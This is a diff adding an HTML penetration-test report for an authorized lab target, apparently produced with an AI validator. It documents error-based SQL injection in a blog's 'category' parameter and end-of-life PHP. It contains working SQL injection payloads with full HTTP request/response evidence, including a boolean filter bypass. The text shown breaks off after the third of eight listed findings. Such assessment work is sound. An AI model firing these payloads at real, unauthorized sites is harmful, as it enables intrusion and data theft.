@@ -1,0 +1,1384 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>VERDICT Report a-mqz0io2c-5gb80i</title><style>
+*{box-sizing:border-box}
+body{font:14px/1.5 -apple-system,Segoe UI,Roboto,Helvetica,Arial,sans-serif;color:#1a1a1a;margin:0;padding:32px;background:#fff}
+h1{font-size:22px;margin:0 0 4px} h2{font-size:17px;margin:28px 0 10px;border-bottom:2px solid #eee;padding-bottom:4px}
+h3{font-size:15px;margin:18px 0 6px}
+code,pre{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace}
+pre{background:#f6f8fa;border:1px solid #e3e6ea;border-radius:6px;padding:10px;overflow:auto;font-size:12.5px;white-space:pre-wrap;word-break:break-word}
+.meta{color:#555;font-size:13px;margin:0 0 2px}
+.badge{display:inline-block;color:#fff;border-radius:4px;padding:1px 8px;font-size:12px;font-weight:700;letter-spacing:.3px}
+.sumtags span{display:inline-block;margin:0 6px 6px 0;padding:2px 10px;border-radius:12px;background:#eef1f4;font-size:12px}
+.f{border:1px solid #e3e6ea;border-radius:8px;padding:14px 16px;margin:0 0 14px}
+.f .kv{color:#555;font-size:12.5px;margin:2px 0}
+.f .desc{margin:8px 0}
+table{border-collapse:collapse;width:100%;font-size:13px}
+th,td{border:1px solid #e3e6ea;padding:6px 8px;text-align:left;vertical-align:top}
+th{background:#f6f8fa}
+table.info td:first-child{width:170px;color:#555;font-weight:600;background:#fafbfc}
+.muted{color:#888}
+img.shot{max-width:220px;max-height:140px;border:1px solid #ddd;border-radius:4px}
+.ev{margin:10px 0 0;border-left:3px solid #cdd5dd;padding-left:10px}
+.ev .evh{font-size:12px;color:#555;margin:0 0 4px}
+.ev .lbl{font-size:11px;font-weight:700;letter-spacing:.4px;color:#5f7d8c;margin:6px 0 2px}
+.ev pre{margin:0;max-height:420px}
+html{scroll-behavior:smooth}
+.toc{background:#fafbfc;border:1px solid #e3e6ea;border-radius:8px;padding:10px 16px;margin:14px 0 8px}
+.toc .toctitle{font-weight:700;font-size:12px;color:#555;letter-spacing:.4px;text-transform:uppercase;margin:0 0 6px}
+.toc ul{margin:0;padding-left:18px} .toc>ul{padding-left:16px;list-style:none}
+.toc li{margin:2px 0;font-size:13px} .toc a{color:#0366d6;text-decoration:none} .toc a:hover{text-decoration:underline}
+.toc .sev{font-weight:700;font-size:11px;letter-spacing:.3px}
+@media print{body{padding:0}.f{break-inside:avoid}.ev pre{max-height:none}.toc{break-inside:avoid}}
+</style></head>
+<body>
+<h1>VERDICT Security Assessment Report</h1>
+<nav class="toc"><div class="toctitle">Contents</div><ul>
+<li><a href="#assessment-information">Assessment Information</a></li>
+<li><a href="#scope">Scope</a></li>
+<li><a href="#summary">Summary</a></li>
+<li><a href="#findings">Findings</a><ul>
+<li><a href="#finding-1">1. <span class="sev" style="color:#d32f2f">HIGH</span> [sqli] SQL Injection via `category` query parameter (error-based)</a></li>
+<li><a href="#finding-2">2. <span class="sev" style="color:#d32f2f">HIGH</span> [sqli] SQL Injection via GET `category` parameter on /index.php</a></li>
+<li><a href="#finding-3">3. <span class="sev" style="color:#d32f2f">HIGH</span> [vulnerable-component] End-of-life PHP 7.4.33 — unpatched since 2022-11-28 (CVE-2023-3824 phar buffer overflow, CVE-2023-3823, CVE-2022-31631)</a></li>
+<li><a href="#finding-4">4. <span class="sev" style="color:#d32f2f">HIGH</span> [burp✓] Input returned in response (reflected)</a></li>
+<li><a href="#finding-5">5. <span class="sev" style="color:#f57c00">MEDIUM</span> [vulnerable-component] Outdated Apache httpd 2.4.54 — known CVEs fixed in 2.4.55/2.4.56 (CVE-2006-20001, CVE-2022-37436, CVE-2023-25690)</a></li>
+<li><a href="#finding-6">6. <span class="sev" style="color:#c9a227">LOW</span> [info-disclosure] PHP error notices expose server filesystem path in every response</a></li>
+<li><a href="#finding-7">7. <span class="sev" style="color:#c9a227">LOW</span> [info-disclosure] Apache directory listing enabled on /images</a></li>
+<li><a href="#finding-8">8. <span class="sev" style="color:#5f7d8c">INFO</span> [burp] Path-relative style sheet import (2 URLs)</a></li>
+</ul></li>
+</ul></nav>
+<h2 id="assessment-information">Assessment Information</h2><table class="info">
+<tr><td>Assessment ID</td><td><code>a-mqz0io2c-5gb80i</code></td></tr>
+<tr><td>Target</td><td><code>http://target.local:32868/</code></td></tr>
+<tr><td>Started</td><td>2026-06-29T09:25:38.279Z</td></tr>
+<tr><td>Generated</td><td>2026-07-02T00:00:00.000Z</td></tr>
+<tr><td>Phase</td><td>report</td></tr>
+<tr><td>Screens</td><td>8 mapped · 8 scanned · 0 remaining</td></tr>
+<tr><td>Hypotheses</td><td>0 (0 confirmed)</td></tr>
+<tr><td>Findings</td><td>8</td></tr>
+<tr><td>Tooling</td><td>VERDICT</td></tr>
+</table>
+<h2 id="scope">Scope</h2><table class="info">
+<tr><td>In-scope hosts</td><td><code>target.local:32868</code></td></tr>
+<tr><td>Out-of-scope hosts</td><td>&mdash;</td></tr>
+<tr><td>In-scope paths</td><td><code>/</code></td></tr>
+<tr><td>Out-of-scope paths</td><td>&mdash;</td></tr>
+<tr><td>Rate</td><td>30 req/min, max 2 concurrent</td></tr>
+</table>
+<h2 id="summary">Summary</h2>
+<p>8 finding(s)</p><p class="sumtags"><span><b style="color:#d32f2f">4</b> high</span><span><b style="color:#f57c00">1</b> medium</span><span><b style="color:#c9a227">2</b> low</span><span><b style="color:#5f7d8c">1</b> info</span></p>
+<h2 id="findings">Findings</h2>
+<div class="f" id="finding-1">
+<h3><span class="badge" style="background:#d32f2f">HIGH</span> 1. [sqli] SQL Injection via `category` query parameter (error-based)</h3>
+<div class="kv">Screen: <code>s-0001</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:32868/</div>
+<div class="desc">The `category` GET parameter is interpolated unsanitized into a MySQL query. Injecting a single quote (`'`) causes the database engine to return a raw error string directly in the HTML response, confirming error-based SQL injection. A boolean bypass (`1' OR '1'='1`) causes the query to return all posts regardless of category, confirming data extraction is possible. PHP `Notice` messages also expose the full server filesystem path (`/var/www/html/index.php`) on every page load, further narrowing attack surface for exploitation.</div>
+<div><b>Reproduction</b></div><pre>1. GET /?category=Nature (baseline — no error, 1515 bytes)
+2. GET /?category=1' — response body contains: &quot;Error in query: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' ORDER BY created_at DESC'&quot;
+3. GET /?category=Nature' — same MySQL error pattern confirming the injection point.
+4. GET /?category=1'+OR+'1'%3D'1 — returns all blog posts, bypassing category filter (6352 bytes vs 1515 bytes baseline).</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqz0r3em-9</code> — <code>artifacts/s-0001/ev-mqz0r3em-9/</code></div><div class="lbl">REQUEST</div><pre>GET /?category=1 HTTP/1.1
+Host: target.local:32868
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: Keep-Alive
+content-length: 1515
+content-type: text/html; charset=UTF-8
+date: Mon, 29 Jun 2026 09:32:11 GMT
+keep-alive: timeout=5, max=96
+server: Apache/2.4.54 (Debian)
+vary: Accept-Encoding
+x-powered-by: PHP/7.4.33
+
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;title&gt;Blog Home&lt;/title&gt;
+    &lt;link rel=&quot;stylesheet&quot; href=&quot;styles.css&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;div class=&quot;container&quot;&gt;
+    &lt;h1&gt;Welcome to Our Blog&lt;/h1&gt;
+
+
+    &lt;form action=&quot;&quot; method=&quot;GET&quot;&gt;
+        &lt;label for=&quot;category&quot;&gt;Choose a category:&lt;/label&gt;
+        &lt;select name=&quot;category&quot; id=&quot;category&quot; onchange=&quot;this.form.submit()&quot;&gt;
+            &lt;option value=&quot;&quot;&gt;All Categories&lt;/option&gt;        
+            &lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Nature' &gt;Nature&lt;/option&gt;&lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Tech' &gt;Tech&lt;/option&gt;&lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Cooking' &gt;Cooking&lt;/option&gt;&lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Photography' &gt;Photography&lt;/option&gt;&lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Health' &gt;Health&lt;/option&gt;&lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Secret' &gt;Secret&lt;/option&gt;        &lt;/select&gt;
+    &lt;/form&gt;
+
+    &lt;p&gt;No posts found.&lt;/p&gt;&lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqz0r2wi-8</code> — <code>artifacts/s-0001/ev-mqz0r2wi-8/</code></div><div class="lbl">REQUEST</div><pre>GET /?category=1%27 HTTP/1.1
+Host: target.local:32868
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: Keep-Alive
+content-length: 1661
+content-type: text/html; charset=UTF-8
+date: Mon, 29 Jun 2026 09:32:10 GMT
+keep-alive: timeout=5, max=97
+server: Apache/2.4.54 (Debian)
+vary: Accept-Encoding
+x-powered-by: PHP/7.4.33
+
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;title&gt;Blog Home&lt;/title&gt;
+    &lt;link rel=&quot;stylesheet&quot; href=&quot;styles.css&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;div class=&quot;container&quot;&gt;
+    &lt;h1&gt;Welcome to Our Blog&lt;/h1&gt;
+
+
+    &lt;form action=&quot;&quot; method=&quot;GET&quot;&gt;
+        &lt;label for=&quot;category&quot;&gt;Choose a category:&lt;/label&gt;
+        &lt;select name=&quot;category&quot; id=&quot;category&quot; onchange=&quot;this.form.submit()&quot;&gt;
+            &lt;option value=&quot;&quot;&gt;All Categories&lt;/option&gt;        
+            &lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Nature' &gt;Nature&lt;/option&gt;&lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Tech' &gt;Tech&lt;/option&gt;&lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Cooking' &gt;Cooking&lt;/option&gt;&lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Photography' &gt;Photography&lt;/option&gt;&lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Health' &gt;Health&lt;/option&gt;&lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Secret' &gt;Secret&lt;/option&gt;        &lt;/select&gt;
+    &lt;/form&gt;
+
+    Error in query: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' ORDER BY created_at DESC' at line 1</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqz0sqll-d</code> — <code>artifacts/s-0001/ev-mqz0sqll-d/</code></div><div class="lbl">REQUEST</div><pre>GET /?category=Nature%27 HTTP/1.1
+Host: target.local:32868
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: Keep-Alive
+content-length: 1666
+content-type: text/html; charset=UTF-8
+date: Mon, 29 Jun 2026 09:33:27 GMT
+keep-alive: timeout=5, max=100
+server: Apache/2.4.54 (Debian)
+vary: Accept-Encoding
+x-powered-by: PHP/7.4.33
+
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;title&gt;Blog Home&lt;/title&gt;
+    &lt;link rel=&quot;stylesheet&quot; href=&quot;styles.css&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;div class=&quot;container&quot;&gt;
+    &lt;h1&gt;Welcome to Our Blog&lt;/h1&gt;
+
+
+    &lt;form action=&quot;&quot; method=&quot;GET&quot;&gt;
+        &lt;label for=&quot;category&quot;&gt;Choose a category:&lt;/label&gt;
+        &lt;select name=&quot;category&quot; id=&quot;category&quot; onchange=&quot;this.form.submit()&quot;&gt;
+            &lt;option value=&quot;&quot;&gt;All Categories&lt;/option&gt;        
+            &lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Nature' &gt;Nature&lt;/option&gt;&lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Tech' &gt;Tech&lt;/option&gt;&lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Cooking' &gt;Cooking&lt;/option&gt;&lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Photography' &gt;Photography&lt;/option&gt;&lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Health' &gt;Health&lt;/option&gt;&lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Secret' &gt;Secret&lt;/option&gt;        &lt;/select&gt;
+    &lt;/form&gt;
+
+    Error in query: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''Nature'' ORDER BY created_at DESC' at line 1</pre></div>
+</div>
+<div class="f" id="finding-2">
+<h3><span class="badge" style="background:#d32f2f">HIGH</span> 2. [sqli] SQL Injection via GET `category` parameter on /index.php</h3>
+<div class="kv">Screen: <code>s-0005</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:32868/</div>
+<div class="desc">The `category` GET parameter on `/index.php` is concatenated unsafely into a MySQL query. Injecting a single quote (`1'--`) causes the server to return a verbose MySQL syntax error exposing the query skeleton (`ORDER BY created_at DESC`). This is the same underlying vulnerability class as the already-confirmed finding on `/` but confirmed independently at the explicit `/index.php` endpoint.</div>
+<div><b>Reproduction</b></div><pre>1. GET /index.php?category=ValidCategory → 200, &quot;No posts found&quot; (1515 bytes, no error).\n2. GET /index.php?category=1'-- → 200, 1658 bytes, body contains &quot;Error in query: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' ORDER BY created_at DESC' at line 1&quot;.</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqz0x2nh-11</code> — <code>artifacts/s-0005/ev-mqz0x2nh-11/</code></div><div class="lbl">REQUEST</div><pre>GET /index.php?category=ValidCategory HTTP/1.1
+Host: target.local:32868
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: Keep-Alive
+content-length: 1515
+content-type: text/html; charset=UTF-8
+date: Mon, 29 Jun 2026 09:36:50 GMT
+keep-alive: timeout=5, max=99
+server: Apache/2.4.54 (Debian)
+vary: Accept-Encoding
+x-powered-by: PHP/7.4.33
+
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;title&gt;Blog Home&lt;/title&gt;
+    &lt;link rel=&quot;stylesheet&quot; href=&quot;styles.css&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;div class=&quot;container&quot;&gt;
+    &lt;h1&gt;Welcome to Our Blog&lt;/h1&gt;
+
+
+    &lt;form action=&quot;&quot; method=&quot;GET&quot;&gt;
+        &lt;label for=&quot;category&quot;&gt;Choose a category:&lt;/label&gt;
+        &lt;select name=&quot;category&quot; id=&quot;category&quot; onchange=&quot;this.form.submit()&quot;&gt;
+            &lt;option value=&quot;&quot;&gt;All Categories&lt;/option&gt;        
+            &lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Nature' &gt;Nature&lt;/option&gt;&lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Tech' &gt;Tech&lt;/option&gt;&lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Cooking' &gt;Cooking&lt;/option&gt;&lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Photography' &gt;Photography&lt;/option&gt;&lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Health' &gt;Health&lt;/option&gt;&lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Secret' &gt;Secret&lt;/option&gt;        &lt;/select&gt;
+    &lt;/form&gt;
+
+    &lt;p&gt;No posts found.&lt;/p&gt;&lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqz0x1z5-10</code> — <code>artifacts/s-0005/ev-mqz0x1z5-10/</code></div><div class="lbl">REQUEST</div><pre>GET /index.php?category=1%27-- HTTP/1.1
+Host: target.local:32868
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: Keep-Alive
+content-length: 1658
+content-type: text/html; charset=UTF-8
+date: Mon, 29 Jun 2026 09:36:49 GMT
+keep-alive: timeout=5, max=100
+server: Apache/2.4.54 (Debian)
+vary: Accept-Encoding
+x-powered-by: PHP/7.4.33
+
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;title&gt;Blog Home&lt;/title&gt;
+    &lt;link rel=&quot;stylesheet&quot; href=&quot;styles.css&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;div class=&quot;container&quot;&gt;
+    &lt;h1&gt;Welcome to Our Blog&lt;/h1&gt;
+
+
+    &lt;form action=&quot;&quot; method=&quot;GET&quot;&gt;
+        &lt;label for=&quot;category&quot;&gt;Choose a category:&lt;/label&gt;
+        &lt;select name=&quot;category&quot; id=&quot;category&quot; onchange=&quot;this.form.submit()&quot;&gt;
+            &lt;option value=&quot;&quot;&gt;All Categories&lt;/option&gt;        
+            &lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Nature' &gt;Nature&lt;/option&gt;&lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Tech' &gt;Tech&lt;/option&gt;&lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Cooking' &gt;Cooking&lt;/option&gt;&lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Photography' &gt;Photography&lt;/option&gt;&lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Health' &gt;Health&lt;/option&gt;&lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Secret' &gt;Secret&lt;/option&gt;        &lt;/select&gt;
+    &lt;/form&gt;
+
+    Error in query: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' ORDER BY created_at DESC' at line 1</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqz0ypz1-17</code> — <code>artifacts/s-0005/ev-mqz0ypz1-17/</code></div><div class="lbl">REQUEST</div><pre>GET /index.php?category=1%27-- HTTP/1.1
+Host: target.local:32868
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: Keep-Alive
+content-length: 1658
+content-type: text/html; charset=UTF-8
+date: Mon, 29 Jun 2026 09:38:06 GMT
+keep-alive: timeout=5, max=100
+server: Apache/2.4.54 (Debian)
+vary: Accept-Encoding
+x-powered-by: PHP/7.4.33
+
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;title&gt;Blog Home&lt;/title&gt;
+    &lt;link rel=&quot;stylesheet&quot; href=&quot;styles.css&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;div class=&quot;container&quot;&gt;
+    &lt;h1&gt;Welcome to Our Blog&lt;/h1&gt;
+
+
+    &lt;form action=&quot;&quot; method=&quot;GET&quot;&gt;
+        &lt;label for=&quot;category&quot;&gt;Choose a category:&lt;/label&gt;
+        &lt;select name=&quot;category&quot; id=&quot;category&quot; onchange=&quot;this.form.submit()&quot;&gt;
+            &lt;option value=&quot;&quot;&gt;All Categories&lt;/option&gt;        
+            &lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Nature' &gt;Nature&lt;/option&gt;&lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Tech' &gt;Tech&lt;/option&gt;&lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Cooking' &gt;Cooking&lt;/option&gt;&lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Photography' &gt;Photography&lt;/option&gt;&lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Health' &gt;Health&lt;/option&gt;&lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Secret' &gt;Secret&lt;/option&gt;        &lt;/select&gt;
+    &lt;/form&gt;
+
+    Error in query: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' ORDER BY created_at DESC' at line 1</pre></div>
+</div>
+<div class="f" id="finding-3">
+<h3><span class="badge" style="background:#d32f2f">HIGH</span> 3. [vulnerable-component] End-of-life PHP 7.4.33 — unpatched since 2022-11-28 (CVE-2023-3824 phar buffer overflow, CVE-2023-3823, CVE-2022-31631)</h3>
+<div class="kv">Screen: <code>(cross-screen)</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:32868/</div>
+<div class="desc">VERSION-BASED finding (matched by banner, not actively exploited). The server advertises `X-Powered-By: PHP/7.4.33` (observed on the 200 responses for / and /index.php; the fingerprint scan parsed this header). PHP 7.4.33 is the FINAL release of the 7.4 series, which reached END OF LIFE on 2022-11-28. As of this assessment it has received no security patches for ~3.5 years, so every PHP-core CVE disclosed after that date is unpatched on this host. Notable post-EOL issues that were fixed in supported branches (8.0.30/8.1.22/8.2.8 and the Dec-2022 releases) but never backported to 7.4: CVE-2023-3824 (stack buffer overflow in phar/php_var_unserialize directory handling — potential code execution, HIGH); CVE-2023-3823 (libxml external-entity / global-state issue — information disclosure); CVE-2022-31631 (PDO::quote integer overflow on SQLite — can defeat quoting → SQL injection); CVE-2023-0567/0568/0662 (bcrypt null-byte handling, 1-byte path-resolution overflow, request-body resource-exhaustion DoS). Note: CVE-2024-4577 (PHP-CGI argument injection) is NOT applicable here — it affects PHP-CGI on Windows code pages, and this is a Debian/Linux host. The operator should treat the EOL status itself as the core risk (no future fixes) and verify the specific CVEs against the actual SAPI/extensions in use before relying on any single one. Separately, display_errors is enabled (PHP Notices leak the absolute path /var/www/html/index.php), confirming a non-hardened production config.</div>
